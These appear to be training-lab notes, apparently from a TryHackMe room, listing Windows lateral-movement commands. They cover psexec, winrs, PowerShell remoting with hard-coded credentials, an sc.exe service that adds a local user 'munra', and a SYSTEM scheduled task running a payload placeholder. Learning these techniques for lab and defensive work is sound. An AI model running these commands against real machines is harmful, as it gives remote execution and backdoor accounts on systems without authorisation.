
## Psexec

- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```


## Remote Process Creation Using WinRM

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

To connect to a remote Powershell session from the command line, we can use the following command:

```shell-session
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```


We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```


## SC.exe

We can create and start a service named "THMservice" using the following commands:

```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

```shell-session
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

## Creating Scheduled Tasks Remotely

```shell-session
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

```shell-session
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```




